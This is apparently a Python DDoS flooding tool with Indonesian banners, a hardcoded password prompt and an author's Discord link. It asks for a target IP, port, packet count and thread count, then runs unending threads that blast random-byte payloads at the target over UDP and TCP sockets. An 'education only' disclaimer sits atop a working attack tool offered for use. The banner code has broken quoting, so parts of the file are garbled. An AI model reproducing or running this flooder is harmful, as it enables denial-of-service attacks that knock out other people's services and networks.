#decode by ryhs
import random
import socket
import threading
import os
import sys
import time
from time import sleep

os.system("clear")
password ="ZIELXXX"

for i in range(3):
	pwd = input("[•] PASSWORD: ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[•] WAIT 5 SECONDS!!! ")
		break
	else:
		time.sleep(5)
		print("[×] PASSWORD SALAH!!! ")
		continue
time.sleep(5)
print("{} Your Account Ha Been Accepted! \033[92mZIELXXX\033[0m ")
time.sleep(5)
os.system("clear")
print("\u001b[31m{} Baca Dulu Maniszzz!")
print("""\u001b[31m
|              WARNING!!!!               |
|                                        |
|DDoS merupakan hal ilegal,perlu di ingat|
|tools ini bertujuan edukasi semata      |
|jika ada yang menyalahgunakannya        |
|jangan salahkan pihak kami selaku       |
|pembuat tools -ZieLxxx                  |
time.sleep(5)
os.system("clear")
print(""
    TOOLS BY ZIELXXX || PLEASE DON'T ABUSE !!!


\033[0m 
                
                
                
                
               

\033[92m========= ZieLxxx X Solo Kontol =========
>> Author : ZieLxxx
>>> Coded : ZieLxxx
>>>> Discord Comunity : https://discord.gg/exopus""")
ip = str(input("[•] IP TARGET : "))
port = int(input("[•] PORT : "))
choice = str(input("[•] GAS MANISZZ? (ddos/n) : "))
times = int(input("[•] PAKET : "))
threads = int(input("[•] THREADS : "))
os.system("clear")
def ddos():
	data = random._urandom(1024)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\u001b[31m ZIELXXX ATTACKING TO\033[92m  {}:{} \u001b[31m".format(ip, port))
		except:
			print("\033[92m [!] MT KAH MANISZZZ?")

def ddos2():
	data = random._urandom(1025)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ZIELXXX ATTACKING TO\033[92m  {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\033[92m [!] MT KAH MANISZZZ?")

def ddos3():
	data = random._urandom(1025)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ZIELXXX ATTACKING TO\033[92m  {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\033[92m [!] MT KAH MANISZZZ?")

for y in range(threads):
	if choice == 'ddos':
		th = threading.Thread(target = ddos)
		th.start()
		th = threading.Thread(target = ddos2)
		th.start()
	else:
	    th = threading.Thread(target = ddos3)
	    th.start()
